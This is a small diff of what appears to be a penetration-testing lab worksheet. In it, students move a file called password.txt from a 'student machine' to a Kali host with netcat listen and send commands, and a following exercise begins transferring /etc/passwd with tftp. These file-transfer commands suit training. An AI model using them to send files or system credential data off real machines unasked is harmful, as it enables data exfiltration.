@@ -17,8 +17,8 @@
 
 1. On the student machine, create a file named password.txt and transfer it to your kali machine with netcat
     > Your commands : touch password.txt  
-    > ON RECEIVING END : nc -l -p 4444 > password.txt  
-    > ON SENDING END : nc -w 5 [destination] 4444 < password.txt  
+    > receiving part : nc -l -p 4444 > password.txt  
+    > sending part : nc -w 5 [destination] 4444 < password.txt  
 
 1. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
     > Your commands :  tftp X.X.X.X
